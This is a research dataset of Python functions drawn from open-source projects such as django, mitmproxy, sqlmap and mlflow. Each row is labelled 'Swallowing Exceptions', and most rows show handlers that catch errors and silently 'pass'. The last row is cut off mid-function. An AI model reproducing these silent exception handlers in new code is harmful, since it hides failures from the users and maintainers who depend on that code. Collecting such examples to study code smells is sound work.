279,musicbox,/home/r4ph/desenv/phd/exception-miner/projects/py/musicbox/NEMbox/player.py,run_mpg123,"def run_mpg123(self, on_exit, url, expires=-1, get_time=-1):
        para = [""mpg123"", ""-R""] + self.config_mpg123
        self.popen_handler = subprocess.Popen(
            para, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        if not url:
            self.notify_copyright_issue()
            if not self.is_single_loop_mode:
                self.next()
            else:
                self.stop()
            return

        self.tune_volume()
        try:
            self.popen_handler.stdin.write(b""L "" + url.encode(""utf-8"") + b""\n"")
            self.popen_handler.stdin.flush()
        except:
            pass

        strout = "" ""
        copyright_issue_flag = False
        frame_cnt = 0
        while True:
            # Check the handler/stdin/stdout
            if not hasattr(self.popen_handler, ""poll"") or self.popen_handler.poll():
                break
            if self.popen_handler.stdout.closed:
                break

            # try to read the stdout of mpg123
            try:
                stroutlines = self.popen_handler.stdout.readline()
            except Exception as e:
                log.warn(e)
                break
            if not stroutlines:
                strout = "" ""
                break
            else:
                strout_new = stroutlines.decode().strip()
                if strout_new[:2] != strout[:2]:
                    # if status of mpg123 changed
                    for thread_i in range(0, len(self.MUSIC_THREADS) - 1):
                        if self.MUSIC_THREADS[thread_i].is_alive():
                            try:
                                stop_thread(self.MUSIC_THREADS[thread_i])
                            except Exception as e:
                                log.warn(e)

                strout = strout_new

            # Update application status according to mpg123 output
            if strout[:2] == ""@F"":
                # playing, update progress
                out = strout.split("" "")
                frame_cnt += 1
                self.process_location = float(out[3])
                self.process_length = int(float(out[3]) + float(out[4]))
            elif strout[:2] == ""@E"":
                self.playing_flag = True
                if (
                    expires >= 0
                    and get_time >= 0
                    and time.time() - expires - get_time >= 0
                ):
                    # 刷新URL，设 self.refresh_url_flag = True
                    self.refresh_urls()
                else:
                    # copyright issue raised, next if not single loop
                    copyright_issue_flag = True
                    self.notify_copyright_issue()
                break
            elif strout == ""@P 0"" and frame_cnt:
                # normally end, moving to next
                self.playing_flag = True
                copyright_issue_flag = False
                break
            elif strout == ""@P 0"":
                # copyright issue raised, next if not single loop
                self.playing_flag = True
                copyright_issue_flag = True
                self.notify_copyright_issue()
                break

        # Ideal behavior:
        # if refresh_url_flag are set, then replay.
        # if not, do action like following:
        #   [self.playing_flag, copyright_issue_flag, self.is_single_loop_mode]: function()
        #       [0, 0, 0]: self.stop()
        #       [0, 0, 1]: self.stop()
        #       [0, 1, 0]: self.stop()
        #       [0, 1, 1]: self.stop()
        #       [1, 0, 0]: self.next()
        #       [1, 0, 1]: self.next()
        #       [1, 1, 0]: self.next()
        #       [1, 1, 1]: self.stop()

        # Do corresponding action according to status
        if self.playing_flag and self.refresh_url_flag:
            self.stop()  # Will set self.playing_flag = False
            # So set the playing_flag here to be True is necessary
            # to keep the play/pause status right
            self.playing_flag = True
            self.start_playing(lambda: 0, self.current_song)
            self.refresh_url_flag = False
        else:
            # When no replay are needed
            if not self.playing_flag:
                self.stop()
            elif copyright_issue_flag and self.is_single_loop_mode:
                self.stop()
            else:
                self.next()",Swallowing Exceptions,1
280,redis-py,/home/r4ph/desenv/phd/exception-miner/projects/py/redis-py/redis/connection.py,__del__,"def __del__(self):
        try:
            self.disconnect()
        except Exception:
            pass",Swallowing Exceptions,1
281,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.4.24/debian/archivebox/usr/lib/python3/dist-packages/archivebox/core/views.py,get,"def get(self, request, path):
        # missing trailing slash -> redirect to index
        if '/' not in path:
            return redirect(f'{path}/index.html')

        if not request.user.is_authenticated and not PUBLIC_SNAPSHOTS:
            return redirect(f'/admin/login/?next={request.path}')

        try:
            slug, archivefile = path.split('/', 1)
        except (IndexError, ValueError):
            slug, archivefile = path.split('/', 1)[0], 'index.html'

        all_pages = list(Snapshot.objects.all())

        # slug is a timestamp
        by_ts = {page.timestamp: page for page in all_pages}
        try:
            # print('SERVING STATICFILE', by_ts[slug].link_dir, request.path, path)
            response = static.serve(request, archivefile, document_root=by_ts[slug].link_dir, show_indexes=True)
            response[""Link""] = f'<{by_ts[slug].url}>; rel=""canonical""'
            return response
        except KeyError:
            pass

        # slug is a hash
        by_hash = {page.url_hash: page for page in all_pages}
        try:
            timestamp = by_hash[slug].timestamp
            return redirect(f'/archive/{timestamp}/{archivefile}')
        except KeyError:
            pass

        # slug is a URL
        by_url = {page.base_url: page for page in all_pages}
        try:
            # TODO: add multiple snapshot support by showing index of all snapshots
            # for given url instead of redirecting to timestamp index
            timestamp = by_url[base_url(path)].timestamp
            return redirect(f'/archive/{timestamp}/index.html')
        except KeyError:
            pass

        return HttpResponse(
            'No archived link matches the given timestamp or hash.',
            content_type=""text/plain"",
            status=404,
        )",Swallowing Exceptions,1
282,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/pupy/dl_hacks.py,_find_library,"def _find_library(name):
    for pattern in NATIVE_LIB_PATTERNS:
        libname = pattern.format(name)
        try:
            return ctypes.CDLL(libname)
        except:
            pass",Swallowing Exceptions,1
283,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_bitmex.py,QA_SU_save_bitmex_symbol,"def QA_SU_save_bitmex_symbol(
    market=bitmex_EXCHANGE,
    client=DATABASE,
):
    """"""
    保存 bitmex 交易对信息
    """"""
    market =  market.upper()
    QA_util_log_info('Downloading {:s} symbol list...'.format(market))

    # 保存 bitmex API 原始 Symbol 数据备查阅，自动交易用得着
    raw_symbol_lists = QA_util_save_raw_symbols(QA_fetch_bitmex_symbols, market)
    if (len(raw_symbol_lists) > 0):
        # 保存到 QUANTAXIS.crypto_asset_list 数字资产列表，为了跨市场统一查询做数据汇总
        symbol_lists = pd.DataFrame(raw_symbol_lists)

        # market,symbol为 mongodb 索引字段，保存之前必须要检查存在
        symbol_lists['market'] = market
        symbol_lists['category'] = symbol_lists['typ']
        symbol_lists.rename(
            {
                'rootSymbol': 'base_currency',
                'quoteCurrency': 'quote_currency',
            },
            axis=1,
            inplace=True
        )
        symbol_lists['price_precision'] = symbol_lists.apply(
            lambda x: 2 + -1 * int(math.log10(float(x.maintMargin))),
            axis=1
        )
        symbol_lists['name'] = symbol_lists['symbol']
        symbol_lists['desc'] = ''

        # 移除非共性字段，这些字段只有 broker 才关心，做对应交易所 broker 接口的时候在交易所 raw_symbol_lists
        # 数据中读取。
        symbol_lists = symbol_lists[[
            'symbol',
            'name',
            'market',
            'state',
            'category',
            'base_currency',
            'quote_currency',
            'price_precision',
            'desc'
        ]]
        if ('_id' in symbol_lists.columns.values):
            # 有时有，必须单独删除
            symbol_lists.drop(
                [
                    '_id',
                ],
                axis=1,
                inplace=True
            )
        symbol_lists['created_at'] = int(
            time.mktime(datetime.datetime.now().utctimetuple())
        )
        symbol_lists['updated_at'] = int(
            time.mktime(datetime.datetime.now().utctimetuple())
        )

        coll_cryptocurrency_list = client.cryptocurrency_list
        coll_cryptocurrency_list.create_index(
            [('market',
              pymongo.ASCENDING),
             ('symbol',
              pymongo.ASCENDING)],
            unique=True
        )
        try:
            query_id = {'market': market}
            if (coll_cryptocurrency_list.count_documents(query_id) > 0):
                # 删掉重复数据
                query_id = {
                    'market': market,
                    'symbol': {
                        '$in': symbol_lists['symbol'].tolist()
                    }
                }
                coll_cryptocurrency_list.delete_many(query_id)
            coll_cryptocurrency_list.insert_many(
                QA_util_to_json_from_pandas(symbol_lists)
            )
            return symbol_lists
        except:
            QA_util_log_expection(
                'QA_SU_save_bitmex_symbol(): Insert_many(symbol) to ""cryptocurrency_list"" got Exception with {} klines'
                .format(len(symbol_lists))
            )
            pass
        return []",Swallowing Exceptions,1
284,django,/home/r4ph/desenv/exception-miner/projects/py/django/tests/staticfiles_tests/storage.py,delete,"def delete(self, name):
        name = self._path(name)
        try:
            os.remove(name)
        except FileNotFoundError:
            pass",Swallowing Exceptions,1
285,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/test/integration/targets/inventory_cache/plugins/inventory/exercise_cache.py,test_pop,"def test_pop(self):
        try:
            self.cache.pop('missing')
        except KeyError:
            pass
        else:
            assert False

        self.test_equal(self.cache.pop('missing', 'default'), 'default')

        self.cache._cache = {'cache_key': 'cache'}
        self.test_equal(self.cache.pop('cache_key'), 'cache')

        # test backing plugin cache isn't modified
        cache_key1 = 'key1'
        cache1 = {'hosts': {'h1': {'foo': 'bar'}}}
        cache_key2 = 'key2'
        cache2 = {'hosts': {'h2': {}}}

        self.cache._cache = {cache_key1: cache1, cache_key2: cache2}
        self.cache.set_cache()

        self.test_equal(self.cache.pop('key1'), cache1)
        self.test_equal(self.cache._cache, {cache_key2: cache2})
        self.test_equal(self.cache._plugin._cache, {cache_key1: cache1, cache_key2: cache2})",Swallowing Exceptions,1
286,sqlmap,/home/r4ph/desenv/exception-miner/projects/py/sqlmap/lib/utils/hashdb.py,close,"def close(self):
        threadData = getCurrentThreadData()
        try:
            if threadData.hashDBCursor:
                threadData.hashDBCursor.connection.commit()
                threadData.hashDBCursor.close()
                threadData.hashDBCursor.connection.close()
                threadData.hashDBCursor = None
        except:
            pass",Swallowing Exceptions,1
287,python-fire,/home/r4ph/desenv/exception-miner/projects/py/python-fire/fire/inspectutils.py,_InfoBackup,"def _InfoBackup(component):
  """"""Returns a dict with information about the given component.

  This function is to be called only in the case that IPython's
  oinspect module is not available. The info dict it produces may
  contain less information that contained in the info dict produced
  by oinspect.

  Args:
    component: The component to analyze.
  Returns:
    A dict with information about the component.
  """"""
  info = {}

  info['type_name'] = type(component).__name__
  info['string_form'] = str(component)

  filename, lineno = GetFileAndLine(component)
  info['file'] = filename
  info['line'] = lineno
  info['docstring'] = inspect.getdoc(component)

  try:
    info['length'] = str(len(component))
  except (TypeError, AttributeError):
    pass

  return info",Swallowing Exceptions,1
288,mitmproxy,/home/r4ph/desenv/exception-miner/projects/py/mitmproxy/mitmproxy/contentviews/grpc.py,safe_decode_as,"def safe_decode_as(
            self,
            intended_decoding: ProtoParser.DecodedTypes,
            try_as_packed: bool = False,
        ) -> tuple[
            ProtoParser.DecodedTypes,
            bool | float | int | bytes | str | list[ProtoParser.Field],
        ]:
            """"""
            Tries to decode as intended, applies failover, if not possible

            Returns selected decoding and decoded value
            """"""
            if self.wire_type == ProtoParser.WireTypes.varint:
                try:
                    return intended_decoding, self.decode_as(
                        intended_decoding, try_as_packed
                    )
                except Exception:
                    if int(self.wire_value).bit_length() > 32:
                        # ignore the fact that varint could exceed 64bit (would violate the specs)
                        return ProtoParser.DecodedTypes.uint64, self.wire_value
                    else:
                        return ProtoParser.DecodedTypes.uint32, self.wire_value
            elif self.wire_type == ProtoParser.WireTypes.bit_64:
                try:
                    return intended_decoding, self.decode_as(
                        intended_decoding, try_as_packed
                    )
                except Exception:
                    return ProtoParser.DecodedTypes.fixed64, self.wire_value
            elif self.wire_type == ProtoParser.WireTypes.bit_32:
                try:
                    return intended_decoding, self.decode_as(
                        intended_decoding, try_as_packed
                    )
                except Exception:
                    return ProtoParser.DecodedTypes.fixed32, self.wire_value
            elif self.wire_type == ProtoParser.WireTypes.len_delimited:
                try:
                    return intended_decoding, self.decode_as(
                        intended_decoding, try_as_packed
                    )
                except Exception:
                    # failover strategy: message --> string (valid UTF-8) --> bytes
                    len_delimited_strategy: list[ProtoParser.DecodedTypes] = [
                        ProtoParser.DecodedTypes.message,
                        ProtoParser.DecodedTypes.string,
                        ProtoParser.DecodedTypes.bytes,  # should always work
                    ]
                    for failover_decoding in len_delimited_strategy:
                        if failover_decoding == intended_decoding and not try_as_packed:
                            # don't try same decoding twice, unless first attempt was packed
                            continue
                        try:
                            return failover_decoding, self.decode_as(
                                failover_decoding, False
                            )
                        except Exception:
                            pass

            # we should never get here (could not be added to tests)
            return ProtoParser.DecodedTypes.unknown, self.wire_value",Swallowing Exceptions,1
289,apprise,/home/r4ph/desenv/phd/exception-miner/projects/py/apprise/apprise/logger.py,__exit__,"def __exit__(self, exc_type, exc_value, tb):
        """"""
        removes the handler gracefully when the with block has completed
        """"""

        # Flush our content
        self.__handler.flush()
        self.__buffer_ptr.flush()

        # Drop our handler
        self.__logger.removeHandler(self.__handler)

        if self.__restore_level is not None:
            # Restore level
            self.__logger.setLevel(self.__restore_level)

        if self.__path:
            # Close our file pointer
            self.__buffer_ptr.close()
            self.__handler.close()
            if self.__delete:
                try:
                    # Always remove file afterwards
                    os.unlink(self.__path)

                except OSError:
                    # It's okay if the file does not exist
                    pass

        if exc_type is not None:
            # pass exception on if one was generated
            return False

        return True",Swallowing Exceptions,1
290,synapse,/home/r4ph/desenv/phd/exception-miner/projects/py/synapse/synapse/http/server.py,return_json_error,"def return_json_error(
    f: failure.Failure, request: ""SynapseRequest"", config: Optional[HomeServerConfig]
) -> None:
    """"""Sends a JSON error response to clients.""""""

    if f.check(SynapseError):
        # mypy doesn't understand that f.check asserts the type.
        exc: SynapseError = f.value
        error_code = exc.code
        error_dict = exc.error_dict(config)
        if exc.headers is not None:
            for header, value in exc.headers.items():
                request.setHeader(header, value)
        error_ctx = exc.debug_context
        if error_ctx:
            logger.info(
                ""%s SynapseError: %s - %s (%s)"", request, error_code, exc.msg, error_ctx
            )
        else:
            logger.info(""%s SynapseError: %s - %s"", request, error_code, exc.msg)
    elif f.check(CancelledError):
        error_code = HTTP_STATUS_REQUEST_CANCELLED
        error_dict = {""error"": ""Request cancelled"", ""errcode"": Codes.UNKNOWN}

        if not request._disconnected:
            logger.error(
                ""Got cancellation before client disconnection from %r: %r"",
                request.request_metrics.name,
                request,
                exc_info=(f.type, f.value, f.getTracebackObject()),
            )
    else:
        error_code = 500
        error_dict = {""error"": ""Internal server error"", ""errcode"": Codes.UNKNOWN}

        logger.error(
            ""Failed handle request via %r: %r"",
            request.request_metrics.name,
            request,
            exc_info=(f.type, f.value, f.getTracebackObject()),
        )

    # Only respond with an error response if we haven't already started writing,
    # otherwise lets just kill the connection
    if request.startedWriting:
        if request.transport:
            try:
                request.transport.abortConnection()
            except Exception:
                # abortConnection throws if the connection is already closed
                pass
    else:
        respond_with_json(
            request,
            error_code,
            error_dict,
            send_cors=True,
        )",Swallowing Exceptions,1
291,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.4.24/archivebox/logging_util.py,progress_bar,"def progress_bar(seconds: int, prefix: str='') -> None:
    """"""show timer in the form of progress bar, with percentage and seconds remaining""""""
    chunk = '█' if PYTHON_ENCODING == 'UTF-8' else '#'
    last_width = TERM_WIDTH()
    chunks = last_width - len(prefix) - 20  # number of progress chunks to show (aka max bar width)
    try:
        for s in range(seconds * chunks):
            max_width = TERM_WIDTH()
            if max_width < last_width:
                # when the terminal size is shrunk, we have to write a newline
                # otherwise the progress bar will keep wrapping incorrectly
                sys.stdout.write('\r\n')
                sys.stdout.flush()
            chunks = max_width - len(prefix) - 20
            pct_complete = s / chunks / seconds * 100
            log_pct = (log(pct_complete or 1, 10) / 2) * 100  # everyone likes faster progress bars ;)
            bar_width = round(log_pct/(100/chunks))
            last_width = max_width

            # ████████████████████           0.9% (1/60sec)
            sys.stdout.write('\r{0}{1}{2}{3} {4}% ({5}/{6}sec)'.format(
                prefix,
                ANSI['green' if pct_complete < 80 else 'lightyellow'],
                (chunk * bar_width).ljust(chunks),
                ANSI['reset'],
                round(pct_complete, 1),
                round(s/chunks),
                seconds,
            ))
            sys.stdout.flush()
            time.sleep(1 / chunks)

        # ██████████████████████████████████ 100.0% (60/60sec)
        sys.stdout.write('\r{0}{1}{2}{3} {4}% ({5}/{6}sec)'.format(
            prefix,
            ANSI['red'],
            chunk * chunks,
            ANSI['reset'],
            100.0,
            seconds,
            seconds,
        ))
        sys.stdout.flush()
        # uncomment to have it disappear when it hits 100% instead of staying full red:
        # time.sleep(0.5)
        # sys.stdout.write('\r{}{}\r'.format((' ' * TERM_WIDTH()), ANSI['reset']))
        # sys.stdout.flush()
    except (KeyboardInterrupt, BrokenPipeError):
        print()
        pass",Swallowing Exceptions,1
292,mindsdb,/home/r4ph/desenv/phd/exception-miner/projects/py/mindsdb/mindsdb/integrations/handlers/tidb_handler/tests/test_tidb_handler.py,test_5_create_table,"def test_5_create_table(self):
        try:
            self.handler.native_query(""CREATE TABLE test_tidb (test_col INT)"")
        except Exception:
            pass",Swallowing Exceptions,1
293,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/packages/all/interactive_shell.py,flush_loop,"def flush_loop(queue, encoding):
    try:
        stdout_write=sys.stdout.write
        stdout_flush=sys.stdout.flush
        if type(sys.stdout) is not file:
            stdout_write=nowait(sys.stdout.write)
            stdout_flush=nowait(sys.stdout.flush)
        while True:
            buf=b""""
            while True:
                try:
                    buf+=queue.get_nowait()
                except Empty:
                    break
            if buf:
                if encoding:
                    try:
                        buf=buf.decode(encoding)
                    except Exception:
                        pass
                stdout_write(buf)
                stdout_flush()
            time.sleep(0.05)
    except:
        print(traceback.format_exc())
        raise",Swallowing Exceptions,1
294,mitmproxy,/home/r4ph/desenv/exception-miner/projects/py/mitmproxy/mitmproxy/dns.py,unpack_from,"def unpack_from(cls, buffer: bytes | bytearray, offset: int) -> tuple[int, Message]:
        """"""Converts the buffer from a given offset into a DNS message and also returns its length.""""""
        (
            id,
            flags,
            len_questions,
            len_answers,
            len_authorities,
            len_additionals,
        ) = Message.HEADER.unpack_from(buffer, offset)
        msg = Message(
            timestamp=time.time(),
            id=id,
            query=(flags & (1 << 15)) == 0,
            op_code=(flags >> 11) & 0b1111,
            authoritative_answer=(flags & (1 << 10)) != 0,
            truncation=(flags & (1 << 9)) != 0,
            recursion_desired=(flags & (1 << 8)) != 0,
            recursion_available=(flags & (1 << 7)) != 0,
            reserved=(flags >> 4) & 0b111,
            response_code=flags & 0b1111,
            questions=[],
            answers=[],
            authorities=[],
            additionals=[],
        )
        offset += Message.HEADER.size
        cached_names = domain_names.cache()

        def unpack_domain_name() -> str:
            nonlocal buffer, offset, cached_names
            name, length = domain_names.unpack_from_with_compression(
                buffer, offset, cached_names
            )
            offset += length
            return name

        for i in range(0, len_questions):
            try:
                name = unpack_domain_name()
                type, class_ = Question.HEADER.unpack_from(buffer, offset)
                offset += Question.HEADER.size
                msg.questions.append(Question(name=name, type=type, class_=class_))
            except struct.error as e:
                raise struct.error(f""question #{i}: {str(e)}"")

        def unpack_rrs(
            section: list[ResourceRecord], section_name: str, count: int
        ) -> None:
            nonlocal buffer, offset
            for i in range(0, count):
                try:
                    name = unpack_domain_name()
                    type, class_, ttl, len_data = ResourceRecord.HEADER.unpack_from(
                        buffer, offset
                    )
                    offset += ResourceRecord.HEADER.size
                    end_data = offset + len_data
                    if len(buffer) < end_data:
                        raise struct.error(
                            f""unpack requires a data buffer of {len_data} bytes""
                        )
                    data = buffer[offset:end_data]
                    if 0b11000000 in data:
                        # the resource record might contains a compressed domain name, if so, uncompressed in advance
                        try:
                            (
                                rr_name,
                                rr_name_len,
                            ) = domain_names.unpack_from_with_compression(
                                buffer, offset, cached_names
                            )
                            if rr_name_len == len_data:
                                data = domain_names.pack(rr_name)
                        except struct.error:
                            pass
                    section.append(ResourceRecord(name, type, class_, ttl, data))
                    offset += len_data
                except struct.error as e:
                    raise struct.error(f""{section_name} #{i}: {str(e)}"")

        unpack_rrs(msg.answers, ""answer"", len_answers)
        unpack_rrs(msg.authorities, ""authority"", len_authorities)
        unpack_rrs(msg.additionals, ""additional"", len_additionals)
        return (offset, msg)",Swallowing Exceptions,1
295,cython,/home/r4ph/desenv/phd/exception-miner/projects/py/cython/runtests.py,run_forked_test,"def run_forked_test(result, run_func, test_name, fork=True):
    if not fork or sys.version_info[0] >= 3 or not hasattr(os, 'fork'):
        run_func(result)
        sys.stdout.flush()
        sys.stderr.flush()
        gc.collect()
        return

    # fork to make sure we do not keep the tested module loaded
    result_handle, result_file = tempfile.mkstemp()
    os.close(result_handle)
    child_id = os.fork()
    if not child_id:
        result_code = 0
        try:
            try:
                tests = partial_result = None
                try:
                    partial_result = PartialTestResult(result)
                    run_func(partial_result)
                    sys.stdout.flush()
                    sys.stderr.flush()
                    gc.collect()
                except Exception:
                    result_code = 1
                    if partial_result is not None:
                        if tests is None:
                            # importing failed, try to fake a test class
                            tests = _FakeClass(
                                failureException=sys.exc_info()[1],
                                _shortDescription=test_name,
                                module_name=None)
                        partial_result.addError(tests, sys.exc_info())
                if partial_result is not None:
                    with open(result_file, 'wb') as output:
                        pickle.dump(partial_result.data(), output)
            except:
                traceback.print_exc()
        finally:
            try: sys.stderr.flush()
            except: pass
            try: sys.stdout.flush()
            except: pass
            os._exit(result_code)

    try:
        cid, result_code = os.waitpid(child_id, 0)
        module_name = test_name.split()[-1]
        # os.waitpid returns the child's result code in the
        # upper byte of result_code, and the signal it was
        # killed by in the lower byte
        if result_code & 255:
            raise Exception(
                ""Tests in module '%s' were unexpectedly killed by signal %d, see test output for details."" % (
                    module_name, result_code & 255))
        result_code >>= 8
        if result_code in (0,1):
            try:
                with open(result_file, 'rb') as f:
                    PartialTestResult.join_results(result, pickle.load(f))
            except Exception:
                raise Exception(
                    ""Failed to load test result from test in module '%s' after exit status %d,""
                    "" see test output for details."" % (module_name, result_code))
        if result_code:
            raise Exception(
                ""Tests in module '%s' exited with status %d, see test output for details."" % (
                    module_name, result_code))
    finally:
        try:
            os.unlink(result_file)
        except:
            pass",Swallowing Exceptions,1
296,mlflow,/home/r4ph/desenv/phd/exception-miner/projects/py/mlflow/mlflow/utils/autologging_utils/__init__.py,autolog,"def autolog(*args, **kwargs):
            config_to_store = dict(default_params)
            config_to_store.update(
                {param.name: arg for arg, param in zip(args, param_spec.values())}
            )
            config_to_store.update(kwargs)
            AUTOLOGGING_INTEGRATIONS[name] = config_to_store

            try:
                # Pass `autolog()` arguments to `log_autolog_called` in keyword format to enable
                # event loggers to more easily identify important configuration parameters
                # (e.g., `disable`) without examining positional arguments. Passing positional
                # arguments to `log_autolog_called` is deprecated in MLflow > 1.13.1
                AutologgingEventLogger.get_logger().log_autolog_called(name, (), config_to_store)
            except Exception:
                pass

            revert_patches(name)

            # If disabling autologging using fluent api, then every active integration's autolog
            # needs to be called with disable=True. So do not short circuit and let
            # `mlflow.autolog()` invoke all active integrations with disable=True.
            if name != ""mlflow"" and get_autologging_config(name, ""disable"", True):
                return

            is_silent_mode = get_autologging_config(name, ""silent"", False)
            # Reroute non-MLflow warnings encountered during autologging enablement to an
            # MLflow event logger, and enforce silent mode if applicable (i.e. if the corresponding
            # autologging integration was called with `silent=True`)
            with set_mlflow_events_and_warnings_behavior_globally(
                # MLflow warnings emitted during autologging setup / enablement are likely
                # actionable and relevant to the user, so they should be emitted as normal
                # when `silent=False`. For reference, see recommended warning and event logging
                # behaviors from https://docs.python.org/3/howto/logging.html#when-to-use-logging
                reroute_warnings=False,
                disable_event_logs=is_silent_mode,
                disable_warnings=is_silent_mode,
            ), set_non_mlflow_warnings_behavior_for_current_thread(
                # non-MLflow warnings emitted during autologging setup / enablement are not
                # actionable for the user, as they are a byproduct of the autologging
                # implementation. Accordingly, they should be rerouted to `logger.warning()`.
                # For reference, see recommended warning and event logging
                # behaviors from https://docs.python.org/3/howto/logging.html#when-to-use-logging
                reroute_warnings=True,
                disable_warnings=is_silent_mode,
            ):
                _check_and_log_warning_for_unsupported_package_versions(name)

                return _autolog(*args, **kwargs)",Swallowing Exceptions,1
297,theano,/home/r4ph/desenv/phd/exception-miner/projects/py/theano/theano/gof/params_type.py,c_init_code,"def c_init_code(self):
        c_init_code_list = []
        for _type in self.types:
            try:
                c_init_code_list.extend(_type.c_init_code())
            except MethodNotDefined:
                pass
        return c_init_code_list",Swallowing Exceptions,1
298,rich,/home/r4ph/desenv/exception-miner/projects/py/rich/rich/jupyter.py,display,"def display(segments: Iterable[Segment], text: str) -> None:
    """"""Render segments to Jupyter.""""""
    html = _render_segments(segments)
    jupyter_renderable = JupyterRenderable(html, text)
    try:
        from IPython.display import display as ipython_display

        ipython_display(jupyter_renderable)
    except ModuleNotFoundError:
        # Handle the case where the Console has force_jupyter=True,
        # but IPython is not installed.
        pass",Swallowing Exceptions,1
299,mailpile,/home/r4ph/desenv/phd/exception-miner/projects/py/mailpile/mailpile/crypto/streamer.py,save,"def save(self, filename, finish=True, mode='wb'):
        if finish:
            self.finish()

        # If no filename, return contents to caller
        if filename is None:
            if not self.saved:
                safe_remove(self.temppath)
                self.saved = True
            self.tempfile.seek(0, 0)
            return self.tempfile.read()

        # 1st save just renames the tempfile
        exists = os.path.exists(filename)
        if (not self.saved and
                (('a' not in mode) or not exists)):
            try:
                if exists:
                    os.remove(filename)
                os.rename(self.temppath, filename)
                self.saved = True
                return
            except (OSError, IOError):
                pass

        # 2nd save (or append to existing) creates a copy
        with open(filename, mode) as out:
            self.save_copy(out)
            if not self.saved:
                safe_remove(self.temppath)
        self.saved = True",Swallowing Exceptions,1
300,numpy,/home/r4ph/desenv/exception-miner/projects/py/numpy/vendored-meson/meson/mesonbuild/mlog.py,stop_pager,"def stop_pager(self) -> None:
        if self.log_pager:
            try:
                self.log_pager.stdin.flush()
                self.log_pager.stdin.close()
            except BrokenPipeError:
                pass
            self.log_pager.wait()
            self.log_pager = None",Swallowing Exceptions,1
301,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/utils/ipc/launch.py,close_log_file,"def close_log_file(self):
        try:
            self._file.close()
        except:
            pass",Swallowing Exceptions,1
302,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_financialfiles.py,QA_SU_save_financial_files,"def QA_SU_save_financial_files(fromtdx=False):
    """"""本地存储financialdata
    """"""
    if (fromtdx):
        download_financialzip_fromtdx()
    else:
        download_financialzip()
        
    coll = DATABASE.financial
    coll.create_index(
        [(""code"", ASCENDING), (""report_date"", ASCENDING)], unique=True)
    for item in os.listdir(download_path):
        if item[0:4] != 'gpcw':
            print(
                ""file "", item, "" is not start with gpcw , seems not a financial file , ignore!"")
            continue

        date = int(item.split('.')[0][-8:])
        print('QUANTAXIS NOW SAVING {}'.format(date))
        print('在数据库中的条数 {}'.format(coll.find({'report_date': date}).count()))
        try:
            data = QA_util_to_json_from_pandas(parse_filelist([item]).reset_index(
            ).drop_duplicates(subset=['code', 'report_date']).sort_index())
            print('即将更新的条数 {}'.format(len(data)))
            # data[""crawl_date""] = str(datetime.date.today())
            try:
                for d in data:
                    coll.update_one({'code': d['code'], 'report_date': d['report_date']}, {'$set': d}, upsert=True)

            except Exception as e:
                if isinstance(e, MemoryError):
                    coll.insert_many(data, ordered=True)
                elif isinstance(e, pymongo.bulk.BulkWriteError):
                    pass
        except Exception as e:
            print('似乎没有数据')



    print('SUCCESSFULLY SAVE/UPDATE FINANCIAL DATA')",Swallowing Exceptions,1
303,gitsome,/home/r4ph/desenv/phd/exception-miner/projects/py/gitsome/xonsh/timings.py,format_time,"def format_time(timespan, precision=3):
    """"""Formats the timespan in a human readable form""""""
    if timespan >= 60.0:
        # we have more than a minute, format that in a human readable form
        parts = [(""d"", 60 * 60 * 24), (""h"", 60 * 60), (""min"", 60), (""s"", 1)]
        time = []
        leftover = timespan
        for suffix, length in parts:
            value = int(leftover / length)
            if value > 0:
                leftover = leftover % length
                time.append(""{0}{1}"".format(str(value), suffix))
            if leftover < 1:
                break
        return "" "".join(time)
    # Unfortunately the unicode 'micro' symbol can cause problems in
    # certain terminals.
    # See bug: https://bugs.launchpad.net/ipython/+bug/348466
    # Try to prevent crashes by being more secure than it needs to
    # E.g. eclipse is able to print a mu, but has no sys.stdout.encoding set.
    units = [""s"", ""ms"", ""us"", ""ns""]  # the save value
    if hasattr(sys.stdout, ""encoding"") and sys.stdout.encoding:
        try:
            ""\xb5"".encode(sys.stdout.encoding)
            units = [""s"", ""ms"", ""\xb5s"", ""ns""]
        except Exception:
            pass
    scaling = [1, 1e3, 1e6, 1e9]

    if timespan > 0.0:
        order = min(-int(math.floor(math.log10(timespan)) // 3), 3)
    else:
        order = 3
    return ""{1:.{0}g} {2}"".format(precision, timespan * scaling[order], units[order])",Swallowing Exceptions,1
304,pysc2,/home/r4ph/desenv/phd/exception-miner/projects/py/pysc2/pysc2/bin/compare_binaries.py,main,"def main(argv):
  """"""Compare the observations from multiple binaries.""""""
  if len(argv) <= 1:
    sys.exit(
        ""Please specify binaries to run / to connect to. For binaries to run, ""
        ""specify the executable name. For remote connections, specify ""
        ""<hostname>:<port>. The version must match the replay."")

  targets = argv[1:]

  interface = sc_pb.InterfaceOptions()
  interface.raw = True
  interface.raw_affects_selection = True
  interface.raw_crop_to_playable_area = True
  interface.score = True
  interface.show_cloaked = True
  interface.show_placeholders = True
  interface.feature_layer.width = 24
  interface.feature_layer.resolution.x = 48
  interface.feature_layer.resolution.y = 48
  interface.feature_layer.minimap_resolution.x = 48
  interface.feature_layer.minimap_resolution.y = 48
  interface.feature_layer.crop_to_playable_area = True
  interface.feature_layer.allow_cheating_layers = True

  run_config = run_configs.get()
  replay_data = run_config.replay_data(FLAGS.replay)
  start_replay = sc_pb.RequestStartReplay(
      replay_data=replay_data,
      options=interface,
      observed_player_id=1,
      realtime=False)
  version = replay.get_replay_version(replay_data)

  timers = []
  controllers = []
  procs = []
  for target in targets:
    timer = stopwatch.StopWatch()
    timers.append(timer)
    with timer(""launch""):
      if _is_remote(target):
        host, port = target.split("":"")
        controllers.append(remote_controller.RemoteController(host, int(port)))
      else:
        proc = run_configs.get(
            version=version._replace(binary=target)).start(want_rgb=False)
        procs.append(proc)
        controllers.append(proc.controller)

  diff_counts = [0] * len(controllers)
  diff_paths = collections.Counter()

  try:
    print(""-"" * 80)
    print(controllers[0].replay_info(replay_data))
    print(""-"" * 80)

    for controller, t in zip(controllers, timers):
      with t(""start_replay""):
